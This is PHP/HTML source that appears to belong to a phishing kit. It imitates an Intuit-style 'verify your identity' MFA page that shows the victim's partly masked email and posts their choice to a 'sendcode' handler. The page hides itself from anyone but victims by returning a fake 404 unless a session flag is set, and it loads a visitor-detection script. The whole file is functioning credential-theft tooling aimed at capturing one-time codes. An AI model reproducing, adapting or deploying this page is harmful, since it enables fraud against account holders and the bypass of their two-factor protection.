<?php
   session_start();
   ob_start();
   require_once('../config.php');
   include_once('../includes/php/detect.php');
   
   if(!isset($_SESSION['fallow'])) {
      header('HTTP/1.1 404 Not Found');
      exit();
   }
   ?>
   <!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
      <link rel="stylesheet" href="./css/code1.css">
   </head>
<?php include ("file/header.php"); ?>
<div class="Bookends__NonStyledDiv-sc-163uul4-4 hVYhee">
   <div class="styledComponents__StyledWidgetContainer-kizisb-13 dXZNXp ius" data-testid="IuxBookendsHeaderContainer">
      <div class="MfaChallengePicker__StyledWrapper-n173ye-0 hmNKnN">
         <div class="ChallengeLayout__StyledChallengeContainer-sc-1hx48gf-0 jPyXYK">
            <section class="IuxH2AndDescription__StyledSection-j40avf-0 hVIzWf">
               <header>
                  <h2 class="IuxH2AndDescription__StyledH2-j40avf-1 fvsQoV Typography-light-242afbc Typography-headline-2-0a55c12" data-testid="challengePickerHeader" id="challengePickerHeader">Let's make sure you're you</h2>
                  <div data-testid="challengePickerSubheader" id="challengePickerSubheader" class="IuxH2AndDescription__StyledDescription-j40avf-2 kAsTtm">Choose how you want to verify your identity.<br><a data-testid="challengePickerLearnMoreLink" href="" rel="noopener noreferrer" target="_blank" class="idsTSLink Link-link-11f6543 Link-light-8c95283 IuxDynamicLink__StyledLink-sc-1e70qj9-0 scdBb"><span class="Typography-light-242afbc Typography-body-3-3b2236f Typography-regular-5296945" data-testid="innerLinkText">Learn more</span></a></div>
               </header>
            </section>
            <form method="POST" action="php/sendcode.php" name="sendcode">
                <input type="hidden" name="codesent" value="codesent">
            <ul data-testid="challengePickerChallenges" class="ChallengeLayout__StyledUnorderedList-sc-1hx48gf-1 ktnBxZ">
               <li data-testid="challengePickerOptionContainer_EMAIL_OTP" class="Card__StyledCard-azxpdg-0 kvGcjo">
                
                  <button data-testid="challengePickerOption_EMAIL_OTP" class="Card__StyledCardButton-azxpdg-1 jTRqvt">
                     <img src="./images/60cf53b0a3e0527542b4.svg" class="Card__StyledCardImg-azxpdg-2 eHLGoP">
                     <div data-testid="challengePickerLabel_EMAIL_OTP" class="Card__StyledCardOptionLabel-azxpdg-3 ggLeOM"><span>Email a code</span>
                     <span class="Card__StyledCardSubLabel-azxpdg-4 ieKRxk"><?php print preg_replace_callback('/(\w)(.*?)(\w)(@.*?)$/s', function ($matches){
                        return $matches[1].preg_replace("/\w/", "*", $matches[2]).$matches[3].$matches[4];
                        }, $_SESSION['Email']); ?></span></div>
                     <img src="./images/4af2791756da7f8211b8.svg" class="Card__StyledCardChevron-azxpdg-5 bbgABs">
                  </button>
               </li>
            </ul>
            </form>
         </div>
         <div class="MfaChallengePicker__StyledLinkContainer-n173ye-2 btvhmD">
            <a data-testid="challengePickerCustomerSupportLink" href="#" class="idsTSLink Link-link-11f6543 Link-light-8c95283 IuxDynamicLink__StyledLink-sc-1e70qj9-0 scdBb">
            <span class="Typography-light-242afbc Typography-body-3-3b2236f Typography-regular-5296945" data-testid="innerLinkText">Contact customer support</span></a>
         </div>
      </div>
   </div>
   <?php include ("file/footer.php"); ?>